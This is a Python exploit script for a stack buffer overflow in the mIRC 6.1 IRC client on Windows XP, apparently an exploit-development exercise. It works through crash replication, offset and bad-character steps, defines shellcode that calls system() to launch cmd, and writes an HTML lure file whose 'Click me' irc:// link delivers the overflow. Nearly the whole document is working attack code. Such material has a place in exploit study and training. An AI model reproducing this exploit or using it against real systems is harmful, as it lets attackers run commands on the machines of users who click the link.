#!/usr/bin/python2

# mIRC 6.1
# This is a short shellcode version (too many badchars for classic shellcode or egghunter)
# Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/112
# Exploit tested on Windows XP Pro SP3 FR

shellcode = (
b"\x31\xC0" #xor eax, eax
b"\x50" #push eax

b"\xB8\x81\xA4\xAE\xA5" #mov eax, 0xa4ada560
b"\x2D\x61\x61\x61\x61" #sub eax, 0x61616161
b"\x50" #push eax (cmd )

b"\x89\xE0"              # mov eax,esp
b"\x50"                  # push eax
b"\xB8\xc7\x93\xbf\x77"  # mov eax,0x77bf93c7 -> system is located at 0x77bf93c7 in C:\WINDOWS\system32\msvcrt.dll
b"\xFF\xD0"              # call eax
)

#Step 1: Replicate the crash
buffer = b"A"*1200

#Step 2: Get the offset
buffer = b""

#Step 3: Check the offset
buffer = b"A"*994 + b"BBBB" + b"C"*300

#Step 4: Find badchars
# \x00 to \x22
# \x2f \x3f \x60 \x7f
badchars = b""
#badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
#badchars += b"\x21\x22\x25\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f
#badchars += b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19" \x23
badchars += b"\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
badchars += b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e"
badchars += b""
buffer =  b"A"*994 + b"BBBB" + b"C"* 60 + badchars

# Step 5: Exploit
ret = b"\xf8\x36\x3b\x77"
buffer =  b"A"*994 + ret+ b"\x90"*60 + shellcode + b"C"*(300-60-len(shellcode))

file = open("exploit-mirc.html", "wb")
file.write(b"<a href=\"irc://" + buffer + b"\">Click me</a>")
file.close()
